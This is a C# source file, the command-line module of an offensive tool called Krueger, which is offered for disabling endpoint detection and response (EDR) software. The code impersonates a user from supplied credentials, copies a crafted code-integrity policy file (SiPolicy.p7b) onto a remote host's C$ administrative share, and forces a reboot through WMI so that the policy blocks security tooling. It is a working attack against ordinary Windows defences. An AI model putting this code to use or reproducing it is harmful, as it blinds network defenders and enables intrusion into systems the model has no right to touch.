
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;
using System.IO;
using System.Runtime.Remoting.Contexts;

namespace Krueger.Modules
{
    internal class ArgParse
    {
        public static void Help()
        {
            string help =
                "Krueger.exe [Options]\n\n" +
                "Options:\n" +
                "\t-h/--help                -     Display this help menu\n" +
                "\t--domain                 -     Kill EDR across the domain\n" +
                "\t--host <hostname>        -     Kill EDR on a specified host\n" +
                "\t--username <user>        -     User to authenticate as\n" +
                "\t--password <password>    -     Password for authenticating user\n";

            Console.WriteLine(help);
        }

        public static Dictionary<string, string> Parse(string[] args, string[] flags, string[] options)
        {
            Dictionary<string, string> cmd = new Dictionary<string, string>();

            foreach (string flag in flags)
            {
                if (args.Contains(flag))
                {
                    try
                    {
                        cmd.Add(flag, args[Array.IndexOf(args, flag) + 1]);
                    }
                    catch
                    {
                        Console.WriteLine("[!] Please supply all the valid options, use \"Cable.exe -h\" for more information");
                        return null;
                    }
                }
            }

            foreach (string option in options)
            {
                if (args.Contains(option))
                {
                    cmd.Add(option, "True");
                }
                else
                {
                    cmd.Add(option, "False");
                }
            }

            return cmd;
        }

        public static void Execute(string[] args)
        {

            if (args.Contains("--help") || args.Contains("-h") || args.Length == 0)
            {
                Help();
            }
            else if (args.Length > 0)
            {
                string host = null;
                string username = null;
                string password = null;
                string domain = null;

                string[] flags = { "--host", "--username", "--password", "--domain" };
                string[] options = { };

                Dictionary<string, string> cmd = Parse(args, flags, options);
                if (cmd == null)
                {
                    return;
                }

                cmd.TryGetValue("--host", out host);
                cmd.TryGetValue("--username", out username);
                cmd.TryGetValue("--password", out password);
                cmd.TryGetValue("--domain", out domain);

                if (host != null)
                {
                    if (username != null || password != null)
                    {
                        if (username != null && password != null)
                        {
                            if (domain == null)
                            {
                                Domain d = Domain.GetCurrentDomain();
                                domain = d.Name;
                            }

                            Console.WriteLine("[+] Launching attack on " + host);
                            AppDomain.CurrentDomain.SetPrincipalPolicy(PrincipalPolicy.WindowsPrincipal);
                            IntPtr token = IntPtr.Zero;
                            Console.WriteLine($"[+] Impersonating user with credentials: {domain}/{username}:{password}");
                            Interop.LogonUser(username, domain, password, (int)LogonType.LOGON32_LOGON_BATCH, (int)LogonProvider.LOGON32_PROVIDER_DEFAULT, ref token);
                            WindowsIdentity identity = new WindowsIdentity(token);
                            WindowsImpersonationContext context = identity.Impersonate();
                            
                            string target = @"\\" + host + @"\C$\Windows\System32\CodeIntegrity\SiPolicy.p7b";
                            
                            byte[] policy = Modules.Policy.ReadPolicy();
                            File.WriteAllBytes(target, policy);
                              
                            Console.WriteLine("[+] Moved policy successfully");
                            bool rebooted = Reboot.WmiReboot(host);
                            context.Undo();
                            if (rebooted)
                            {
                                Console.WriteLine("[+] Rebooted target");
                            }
                            else
                            {
                                Console.WriteLine("[!] Target has not been rebooted");
                            }

                        }
                        else
                        {
                            Console.WriteLine("[!] You must specify both a username and password");
                        }
                    }
                    else
                    {
                        Console.WriteLine("[+] Launching attack on " + host);
                        string target = @"\\" + host + @"\C$\Windows\System32\CodeIntegrity\SiPolicy.p7b";
                        byte[] policy = Modules.Policy.ReadPolicy();
                        File.WriteAllBytes(target, policy);
                        Console.WriteLine("[+] Moved policy successfully");
                        bool rebooted = Reboot.WmiReboot(host);
                        if (rebooted)
                        {
                            Console.WriteLine("[+] Rebooted target");
                        }
                        else
                        {
                            Console.WriteLine("[!] Target has not been rebooted");
                        }
                    } 
                }
            }
            else
            {
                Console.WriteLine("[!] Please specify an option: use \"Krueger.exe -h\" for more details");
            }
            
        }
    }
}
